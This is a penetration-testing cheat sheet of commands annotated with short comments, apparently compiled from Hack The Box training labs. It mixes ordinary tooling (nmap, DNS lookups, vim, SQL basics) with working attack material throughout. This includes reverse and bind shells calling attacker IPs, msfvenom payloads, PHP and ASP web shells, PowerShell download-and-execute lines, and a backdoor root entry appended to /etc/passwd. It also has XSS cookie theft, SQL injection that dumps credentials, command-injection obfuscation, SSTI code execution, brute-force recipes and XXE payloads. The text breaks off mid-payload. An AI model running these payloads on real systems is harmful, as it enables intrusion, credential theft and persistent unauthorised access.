Getting Started:
netstat -rn || Show networks accessible via the VPN
ssh user@10.10.10.10 || SSH to a remote server
ftp 10.129.42.253 || FTP to a remote server
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP" || dotnet version finder
find / -iname root.txt -exec wc {} \; || To find files
lsb_release -a || To find version of OS linux
echo 'moni:$1$e2h/oLb4$CZwn7oKK1Y1J0BGPb2/Qi:0:0:gotcha:/root:/bin/bash' >> /etc/passwd
netstat -antp | grep -i list
nuclei -u http://backdoor.htb x
nmap --script vuln 10.10.10.10
sslyze --heartbleed 10.10.10.10 || To find SSL plugins are vulnerable 
chmod -R a+rwX directory/     || To change complete root permision to user
sed -i 's/.*/"&",/' passwords.txt | cat passwords.txt  || To add "xxx" to all line JSON FORMAT


for i in $(seq 0 100); do whoami; done  || Run in loop


  GREP:
  grep -v -e '^$'  || To avoid Blank lines
  

  FUZZ
  sudo sed -i 's/^\#.*$//g' /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt && sudo sed -i '/^$/d' /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
  ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ  || Directory Fuzzing
  ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ  || Extention Fuzzing
  ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php  || Page Fuzzing
  ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v  || Recursive Fuzzing
  ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/  || GET Subdomain scanning
  ffuf -c -u http://artcorp.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.artcorp.htb"  -mc 200   || POST Subdomain scanning 
  ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx  || vhosts scanning
  ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx  || Parameter Fuzzing
  ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx || POST Parameter fuzzing
  ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx || Value Fuzzing
  ffuf -u http://10.129.201.238/load?q=http://internal.app.local/load?q=http::////127.0.0.1:FUZZ -w ports.txt:FUZZ -fr 'Errno[[:blank:]]111'  || Filter results using regex
  /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt  || Directory/Pages Wordlists
  /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt  || Extentions Wordlists
  /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  || Domain wordlists
  /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt  || Parameter wordlists
  for i in $(seq 1 1000); do echo $i >> ids.txt; done || Create sequence wordlists
  curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'  || curl POST request
  

  Deobfuscation :
  echo hackthebox | base64  || encode base64
  echo ENCODED_B64 | base64 -d  || decode base64
  echo hackthebox | xxd -p  || encode hex
  echo ENCODED_HEX | xxd -p -r  || decode hex
  echo hackthebox | tr 'A-Za-z' 'N-ZA-Mn-za-m'  || encode rot13
  echo ENCODED_ROT13 | tr 'A-Za-z' 'N-ZA-Mn-za-m'  || decode rot13
  https://jsconsole.com/  || JSConsole
  http://www.jsnice.org/   || JSNise
  https://obfuscator.io/   || obfuscator
  

  DNS:
  sudo dig @10.10.10.29 bank.htb axfr |grep -oE '(\w+\.)?\w+\.htb' |sort -u || To Sort_dns_zone_transfer_results
  export TARGET="domain.tld"  || Assign target to an environment variable
  nslookup $TARGET || Identify the `A` record for the target domain
  nslookup -query=A $TARGET  || Identify the `A` record for the target domain
  dig $TARGET @<nameserver/IP> || Identify the `A` record for the target domain
  dig a $TARGET @<nameserver/IP> || Identify the `A` record for the target domain
  nslookup -query=PTR <IP>  || Identify the `PTR` record for the target IP address
  dig -x <IP> @<nameserver/IP> || Identify the `PTR` record for the target IP address
  nslookup -query=ANY $TARGET || Identify `ANY` records for the target domain
  dig any $TARGET @<nameserver/IP>  || Identify `ANY` records for the target domain
  nslookup -query=TXT $TARGET  || Identify the `TXT` records for the target domain
  dig txt $TARGET @<nameserver/IP>  || Identify the `TXT` records for the target domain
  nslookup -query=MX $TARGET   || Identify the `MX` records for the target domain
  dig mx $TARGET @<nameserver/IP>  || Identify the `MX` records for the target domain
  curl -s https://sonar.omnisint.io/reverse/{ip} \| jq -r '.[]' \| sort -u   || Reverse DNS lookup on IP address
  curl -s https://sonar.omnisint.io/reverse/{ip}/{mask} \| jq -r '.[]' \| sort -u  || Reverse DNS lookup of a CIDR range
  dig @10.129.151.122 axfr inlanefreight.htb || TO FIND SUBDOMAINS && Zone transfers
  dig @10.129.151.122 +short NS inlanefreight.htb || TO FIND NAME SERVER
    
  Passive Subdomain Enumeration:
  curl -s https://sonar.omnisint.io/subdomains/{domain} | jq -r '.[]' | sort -u  || All subdomains for a given domain
  curl -s https://sonar.omnisint.io/tlds/{domain} | jq -r '.[]' | sort -u  || All TLDs found for a given domain
  curl -s https://sonar.omnisint.io/all/{domain} | jq -r '.[]' | sort -u  || All results across all TLDs for a given domain
  curl -s https://sonar.omnisint.io/reverse/{ip} | jq -r '.[]' | sort -u   || Reverse DNS lookup on IP address
  curl -s "https://crt.sh/?q=${TARGET}&output=json" | jq -r '.[] | "\(.name_value)\n\(.common_name)"' | sort -u  || Certificate Transparency
   
  Active Subdomain Enum:
  gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"  ||Bruteforcing subdomains
  nslookup -type=any -query=AXFR $TARGET nameserver.target.domain || Zone Transfer using Nslookup against the target domain and its nameserver
  
  VHOSTS:
  cat ./vhosts.list | while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://<IP address> -H "HOST: ${vhost}.target.domain" | grep "Content-Length: ";done ||Bruteforcing for possible virtual hosts on the   		 target domain.
  
  
  
  Shell to RDP Create and LOGIN:
  net user moni dec@2021 /add
  net user moni
  net localgroup administrators moni /add
  netsh advfirewall set allprofiles state off
  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
  xfreerdp /u:moni /p:dec@2021 /v:10.10.10.95 /smart-sizing
   Windows Password shell
   psexec.py Domain.local/uusername@host cmd.exe
   winexe -U Domain/username //host cmd.exe

  Directory Scan:
  wfuzz -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://api-prod.horizontall.htb/FUZZ -v -c --hc 404,403 --hw 33

  Subdomain Scan:
  gobuster vhost -u http://horizontall.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

  TMUX:
  tmux || Start tmux
  ctrl+b || tmux: default prefix
  prefix c || tmux: new window
  prefix 1 || tmux: switch to window
  prefix shift+% || tmux: split pane vertically
  prefix shift+" || tmux: split pane horizontally

  VIM:
  vim file || vim: open file with vim
  esc+i || vim: enter insert mode
  esc || vim: back to normal mode
  x || vim: Cut character
  dw || vim: Cut word
  dd || vim: Cut full line
  yw || vim: Copy word
  yy || vim: Copy full line
  p || vim: Paste
  :1 || vim: Go to line number 1
  :w || vim: Write the file i.e. save
  :q || vim: Quit
  :q! || vim: Quit without saving
  :wq || vim: Write and quit

  NMAP:
  nmap 10.129.42.253 || Run nmap on an IP
  nmap -sV -sC -p- 10.129.42.253 || Run an nmap script scan on an IP
  locate scripts/citrix || List various available nmap scripts
  nmap --script smb-os-discovery.nse -p445 10.10.10.40 || Run an nmap script on an IP
  sudo find /usr/share/nmap/scripts/*dist* -type f 2>/dev/null || To find nmap scripts

  SMB:
  cme smb ip  || To get SMB header
  cmd smb ip --users || to enum users
  smbclient -N -L \\\\10.129.42.253 || List SMB Shares
  smbclient \\\\10.129.42.253\\users || Connect to an SMB share
  snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0 || Scan SNMP on an IP
  onesixtyone -c dict.txt 10.129.42.254 || Brute force SNMP secret string

  Shells:
  nc -lvnp 1234 || Start a nc listener on a local port
  bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1' || Send a reverse shell from the remote server
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f || Another command to send a reverse shell from the remote server
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f || Start a bind shell on the remote server
  echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' || tee -a monitor.sh
  nc 10.10.10.1 1234 || Connect to a bind shell started on the remote server
  ctrl+z then stty raw -echo then fg then enter twice || Upgrade shell TTY
  echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php || Create a webshell php file
  curl http://SERVER_IP:PORT/shell.php?cmd=id || Execute a command on an uploaded webshell
  psexec.py htb-student@10.129.157.234 || CMD to user login
  xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt! || CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol
  env || Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf || MSFvenom command used to generate a linux-based reverse shell stageless payload
  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe || MSFvenom command used to generate a Windows-based reverse shell stageless payload
  msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho || MSFvenom command used to generate a MacOS-based reverse shell payload
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp || MSFvenom command used to generate a ASP web reverse shell payload
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp || MSFvenom command used to generate a JSP web reverse shell payload
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war || MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload
  msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php || Generate PHP reverse shell
    python -c 'import pty; pty.spawn("/bin/bash")' || Upgrade shell TTY
    Ctrl+Z
    stty raw -echo; fg
    export TERM=xterm
    stty rows 51 cols 237
  /bin/sh -i` || Spawns an interactive shell on a linux-based system
  perl —e 'exec "/bin/sh";' || Uses `perl` to spawn an interactive shell on a linux-based system
  ruby: exec "/bin/sh" || Uses `ruby` to spawn an interactive shell on a linux-based system
  Lua: os.execute('/bin/sh') || Uses `Lua` to spawn an interactive shell on a linux-based system
  awk 'BEGIN {system("/bin/sh")}' || Uses `awk` command to spawn an interactive shell on a linux-based system
  find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \; || Uses `find` command to spawn an interactive shell on a linux-based system
  find . -exec /bin/sh \; -quit || An alternative way to use the `find` command to spawn an interactive shell on a linux-based system
  vim -c ':!/bin/sh' || Uses the text-editor `VIM` to spawn an interactive shell. Can be used to escape "jail-shells"
  sudo -l || Displays the commands that the currently logged on user can run as `sudo`
  <?php system($_GET['cmd']); ?>
  <?php file_get_contents('/etc/passwd'); ?>  ||  	Basic PHP File Read
  <?php system('hostname'); ?>    || Basic PHP Command Execution
  <?php system($_REQUEST['cmd']); ?>  || Basic PHP Web Shell
  <% eval request('cmd') %>  || Basic ASP Web Shell

  Privilege Escalation"
  ./linpeas.sh || Run linpeas script to enumerate remote server
  sudo -l || List available sudo privileges
  sudo -u user /bin/echo Hello World! || Run a command with sudo
  sudo su - || Switch to root user (if we have access to sudo su)
  sudo su user - || Switch to a user (if we have access to sudo su)
  ssh-keygen -f key || Create a new SSH key
  echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys || Add the generated public key to the user
  ssh root@10.10.10.10 -i key || SSH to the server with the generated private key

  File Transfer:
  powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.2/p.ps1)
  powershell "(new-object System.Net.WebClient).Downloadfile('http://<IP>/writeup.exe', 'writeup.exe')"
  python3 -m http.server 8000 || Start a local webserver
  wget http://10.10.14.1:8000/linpeas.sh || Download a file on the remote server from our local machine
  curl http://10.10.14.1:8000/linenum.sh -o linenum.sh || Download a file on the remote server from our local machine
  scp linenum.sh user@remotehost:/tmp/linenum.sh || Transfer a file to the remote server with scp (requires SSH access)
  base64 shell -w 0 || Convert a file to base64
  echo BASE64STRING... | base64 -d > shell` || Convert a file from base64 back to its original file
  md5sum filename || Check the files md5sum to ensure it converted correctly
  certutil -urlcache -split -f http://10.10.14.7/w.exe win.exe || Windows wget
  println "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7/p.ps1')".execute().text || powershell download and execute

  Web_Request:
  curl http:/SERVER_IP:PORT/   || Curl get request
  curl -s http:/SERVER_IP:PORT/ -X POST || curl POST request
  curl -s http:/SERVER_IP:PORT/ -X POST -d "param1=sample" || curl POST request with data
  curl -h || cURL help menu
  curl inlanefreight.com || Basic GET request
  curl -s -O inlanefreight.com/index.html || Download file
  curl -k https://inlanefreight.com || Skip HTTPS (SSL) certificate validation
  curl inlanefreight.com -vvv || Print full HTTP request/response details
  curl -I https://www.inlanefreight.com || Send HEAD request (only prints response headers)
  curl -i https://www.inlanefreight.com || Print response headers and response body
  curl https://www.inlanefreight.com -A 'Mozilla/5.0' || Set User-Agent header
  curl -u admin:admin http://<SERVER_IP>:<PORT>/ || Set HTTP basic authorization credentials
  curl http://admin:admin@<SERVER_IP>:<PORT>/ || Pass HTT basic authorization credentials in the URL
  curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/ || Set request header
  curl 'http://<SERVER_IP>:<PORT>/search.php?search=le' || Pass GET parameters
  curl -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/ || Send POST request with POST data
  curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/ || Set request cookies
  curl -X POST -d '{"search":"flag"}' -b 'PHPSESSID=1m1o0554vh89gg9gm19f5967qr' -H 'Content-Type: application/json' http://188.166.153.161:31818/search.php || Using cookie to show our session through terminal and access file
  APIS:
  curl http://<SERVER_IP>:<PORT>/api.php/city/london || Read entry
  curl -s http://<SERVER_IP>:<PORT>/api.php/city/ | jq || Read all entries
  curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json' || Create (add) entry
  curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json' || Update (modify) entry
  curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City || Delete entry

  LFI:
  php://filter/read=convert.base64-encode/resource=/etc/passwd || PHP filter to convert file contents to Base64
  php://filter/read=string.rot13/resource=/etc/passwd || PHP filter to convert file contents to ROT13
  expect://id || Command execution with PHP `Expect` wrapper
  curl -s -X POST --data "<?php system('id'); ?>" "http://138.68.179.179:31246/index.php?language=php://input" | grep -i uid  || Using PHP `Input` wrapper for command execution
    echo '<?php system($_GET['cmd']); ?>' > exec.php
    zip malicious.zip exec.php
    zip://malicious.zip%23exec.php&cmd=id || Command execution with the PHP `Zip` wrapper
  <?php system($_GET['cmd']); ?> || PHP web shell file contents (i.e., shell.php) || ADD THIS IN USER-AGENT AND INPUT /var/log/apache2/access.log&cmd=id
  OR /var/log/nginx/access.log , /var/log/sshd.log , /var/log/mail , /var/log/vsfpd.log
  php://filter/read=convert.base64-encode/resource=config  || To read th files
    echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php  || Convert jpg to zip
    http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
  php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg  || Convert a php script to phar file
  http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id  || Syntax to exploit





  RFI:
  echo '<?php system($_GET['cmd']); ?>' > exec.php
  python3 -m http.server 8081 || in same directory
  LFI=http://10.10.16.2:8081/exec.php&cmd=id || RFI---HTTP

  echo '<?php system($_GET['cmd']); ?>' > exec.php
  python3 -m pyftpdlib -p 21 || in same directory
  LFI=ftp://10.10.16.2/exec.php&cmd=id
                (OR)
  LFI=ftp://user:pass@localhost/exec.php&cmd=id || RFI---FTP

  echo '<?php system($_GET['cmd']); ?>' > exec.php
  smbserver.py -smb2support share $(pwd)
  LFI=\\10.10.16.2\share\exec.php&cmd=id
  
  
  XSS:
  <script>alert(window.origin)</script>  || Basic XSS PAyload
  <plaintext>   || Basic XSS payload
  <script>print()</script>  || basic xss payload
  <img src="" onerror=alert(window.origin)>  || HTml based xss payload
  <script>document.body.style.background = "#141d2b"</script>  || Change Background Color
  <script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>  || Change Background Image
  <script>document.title = 'HackTheBox Academy'</script>  || Change Website Title
  <script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>  || Overwrite website's main body
  <script>document.getElementById('urlform').remove();</script>  || Remove certain HTML element
  <script src="http://OUR_IP/script.js"></script> || Load remote script
  "><script src=http://10.10.14.18/script.js></script>  || Load remote script
  <script>new Image().src='http://OUR_IP/cookie.php?c='+document.cookie</script>  || Send Cookie details to us
  python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"  || Run xsstrike on a url parameter
  sudo php -S 0.0.0.0:80  || start PHP Server

  SQL FUN
  mysql -u root -h docker.hackthebox.eu -P 3306 -p  || login to mysql
  SHOW DATABASES;  || print databases
  use databasename  ||  switch to databases
  CREATE TABLE logins (id INT, ...)  || Create a new table
  SHOW TABLES   || print a tables
  DESCRIBE tablename  ||  show tables properties and columns
  INSERT INTO table_name VALUES (value_1,..)  || Add value to table
  INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)   || Add values to specific column in table
  UPDATE table_name SET column1=newvalue1, ... WHERE <condition>  || Update table values
  SELECT * FROM table_name  || Show all columns in table
  SELECT column1, column2 FROM table_name  || show specific column in table
  DROP TABLE logins || Delete a table
  ALTER TABLE logins ADD newColumn INT   || Add new column
  ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn  || rename column
  ALTER TABLE logins MODIFY oldColumn DATE  || change column datatype
  ALTER TABLE logins DROP oldColumn  || Delete column
  SELECT * FROM logins ORDER BY column_1  || Sort by column 1
  SELECT * FROM logins ORDER BY column_1 DESC  || Sort by column by decending order
  SELECT * FROM logins ORDER BY column_1 DESC, id ASC  || Sort by two columns
  SELECT * FROM logins LIMIT 2  || Only show first 2 results
  SELECT * FROM logins LIMIT 1, 2 || Only show first two results starting from index 2
  SELECT * FROM table_name WHERE <condition>  ||  List results that meet a condition
  SELECT * FROM logins WHERE username LIKE 'admin%'  ||  List results where the name is similar to a given string
  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass  || Authentication bypass sql injection
  ' order by 1-- -   ||  Detect number of columns using order by
  cn' UNION select 1,2,3-- -  ||  Detect number of columns using Union injection
  cn' UNION select 1,@@version,3,4-- -  ||  Basic Union injection
  UNION select username, 2, 3, 4 from passwords-- -  || Union injection of 4 columns
  SELECT @@version  ||  	Fingerprint MySQL with query output
  SELECT SLEEP(5)  ||  	Fingerprint MySQL with no output
  cn' UNION select 1,database(),2,3-- -  || Current database name
  cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -  || List of all databases
  cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -  || List all tables in a specific database
  cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'--   || List all columns in a specific table
  cn' UNION select 1, username, password, 4 from dev.credentials-- -  || Dump data from a table in another database
  cn' UNION SELECT 1, user(), 3, 4-- -  || Find current user
  cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -  || Find if user has admin privileges
  cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -  || Find if all user privileges
  cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -   || Find which directories can be accessed through MySQL
  cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -   ||  	Read local file
  select 'file written successfully!' into outfile '/var/www/html/proof.txt'  || Write a string to a local file
  cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -  || Write a web shell into the base web directory
  
  COMMAND-INJECTION
  ; || %3b || Semicolan
  \n || %0a || new line
  &  || %26  || Background
  | || %7c || Pipe only second output shows
  && || %26%26 || Only if first susceed
  || | %7c%7c || Ony if first fails
  printenv  ||  	Can be used to view all environment variables 
  %09  ||  Using tabs instead of spaces
  ${IFS}  || Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $())
  {ls,-la} || Commas will be replaced with spaces
  ${PATH:0:1} ||  Will be replaced with /
  ${LS_COLORS:10:1}  || Will be replaced with ;
  $(tr '!-}' '"-~'<<<[)  ||  Shift character by one ([ -> \)
  $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")  || Changes all upper case to lower case
  echo 'whoami' | rev  || Print strings in reverse
  $(rev<<<'imaohw')  || execute reversed commands
  echo -n 'cat /etc/passwd | grep 33' | base64  || Encode string with base64
  echo -n whoami | iconv -f utf-8 -t utf-16le | base64  || Encode string with base64 utf-16le
  bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)  || Execute base64 encorded string
   git clone https://github.com/Bashfuscator/Bashfuscator
   cd Bashfuscator
   python3 setup.py install --user
   cd ./bashfuscator/bin/
   ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
  WINDOWS
  Get-ChildItem Env:  ||  Can be used to view all environment variables - (PowerShell)
  %PROGRAMFILES:~10,-5%  || Will be replaced with a space - (CMD)
  $env:PROGRAMFILES[10]  || Will be replaced with a space - (PowerShell)
  %HOMEPATH:~0,-17%  ||  	Will be replaced with \ - (CMD)
  $env:HOMEPATH[0]  || Will be replaced with \ - (PowerShell)
  ^ ||  	Windows only (CMD)
  "whoami"[-1..-20] -join ''  || reverse a string {powershell}
  iex "$('imaohw'[-1..-20] -join '')"  || execute reversed command {powershell}
  [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))  || Encode string tto base64 {powershell}
  iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"  || Execute encorded base64 string {powershell}
   git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
  
  SSRF
  Check if there any proxy page as tomcat etc..
  inject SSRF Payloads in uploaded files in server developed program
  curl -i -s -L http://<TARGET IP>
  curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8080"  || nc -lnvp 8080  || Checking if http is works or not
   sudo pip3 install twisted
   sudo python3 -m twisted ftp -p 21 -r .
   curl -i -s "http://<TARGET IP>/load?q=ftp://<VPN/TUN Adapter IP>/index.html"  || checking if FTP is working or not
  curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd"  || Checking if FILE is working or not. 
  for port in {1..65535};do echo $port >> ports.txt;done  || Creating a file in loop form
  curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -  || Checking the current directory
   Check if there is SSI Serevr side Includes using verifing the extensions as .shtml, .shtm, .stm etc..
   <!--#echo var="DATE_LOCAL" --> || Date
   <!--#flastmod file="index.html" --> || Modification date of a file
   <!--#include virtual="/cgi-bin/counter.pl" -->  ||  CGI Program results
   <!--#include virtual="/footer.html" -->  || Including a footer
   <!--#exec cmd="ls" -->  || Executing commands
   <!--#set var="name" value="Rich" -->  || Setting variables
   <!--#include virtual="file_to_include.html" -->  || Including virtual files (same directory)
   <!--#include file="file_to_include.html" -->  || Including files (same directory)
   <!--#printenv -->  || Print all variables
   
   SSTI
   ${{<%[%'"}}%\    || Template injection characters
   {{7*7}}
   ${7*7}
   <%= 7*7 %>
   ${{7*7}}
   #{7*7}
   Use https://github.com/epinna/tplmap.git
   {{_self.env.display("TEST"}}  || {{config.items()}}  ||  {{ [].class.base.subclasses() }}  || To conform TWIG
   {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("printenv;uname -a;hostname")}}  || TWIG RCE
   
   LOGIN-BYPASS
   Windows = unattend.xml | sysprep.inf | SAM  || Password stored files.
   Linux   = shadow | shadow.bak | password    || Password stored files.  
   hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e  || To find the supported method to bypass ex:http-get...
   sed -ri '/^.{,7}$/d' william.txt  ||  remove shorter than 8
   sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt ||  remove no special chars
   sed -ri '/[0-9]+/!d' william.txt  ||  remove no numbers
   hydra -C wordlist.txt SERVER_IP -s PORT http-get /   || Basic Auth Brute Force - Combined Wordlist
   hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /   ||  Basic Auth Brute Force - User/Pass Wordlists
   hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"   || Login Form Brute Force - Static User, Pass Wordlist
   hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4   ||  SSH Brute Force - User/Pass Wordlists
   hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1  ||  FTP Brute Force - Static User, Pass Wordlist
   cupp -i  ||  Creating Custom Password Wordlist
   /opt/useful/SecLists/Usernames/Names/names.txt  || Common names wordlists
   /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt  || Common Password Wordlists
   /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt  || Default Combined Password wordlists
   ./username-anarchy Harry Potter > bill.txt  || Create a customized usernames with single username

   Broken-Auth
   HAS--IS--KNOWS
   X-Forwarded-For: 127.0.0.1  || Adding IP Header
    User Enum:
    User Unknown Attack-Read every responces sources
    Username Existence Inference
    Timing Attack
    Enumerate through Password Reset
    Enumerate through Registration Form
    Predictable Usernames
    grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep -E '^.{8,12}$'  || To filter passwords that matches policies
  wfuzz -z file,/path/to/wordlist.txt -u http://127.0.0.1:80/site/FUZZ || Fuzz using a wordlist
  wfuzz -z file,/path/to/user.txt -z file,/path/to/pass.txt http://127.0.0.1/login.php -d "user=FUZZ&pass=FUZ2Z" || Fuzz using POST method and two wordlists
  wfuzz -H Foo:FUZZ || Fuzz header
  -X GET , -X POST || Choose method  
  grep '[[:classname:]]' file.txt || Find strings that contain a given class. Classes are: [[:graph:]], [[:lower:]], [[:print:]], [[:punct:]], [[:space:]], [[:upper:]], and [[:xdigit:]]
  grep -x '.\{123\}' || Find strings with length of 123
  echo -n academy | xxd -p || Convert hex to ASCII
  echo -n 61636164656d79 | xxd -r -p || Convert ASCII to hex
grep -E '^.{20}$' /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt | grep '^[[:upper:]]' | grep '[[:lower:]]' | grep '[[:digit:]]$' | grep -E '+[$#@]'  | onthesauce

Web Attacks
 Web tampering OPTIONS GET HEAD POST PUT DELETE TRAC CONNECT
 If WEBDEV extentions is enabled PROPFIND PROPPATCH MKCOL COPY MOVE LOCK UNLOCK
Insecure Direct Object References (IDOR)

XML External Entity (XXE) Injection      || basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
&company;                                              || To verify XXE vulnerability 
--------------------------------------------------------------------------------------------
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
&company;                                              || To read files
--------------------------------------------------------------------------------------------
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
&company;                                              || To read non XML files PHP filters
--------------------------------------------------------------------------------------------
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
&company;                                              || upload files PHP filters
--------------------------------------------------------------------------------------------
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
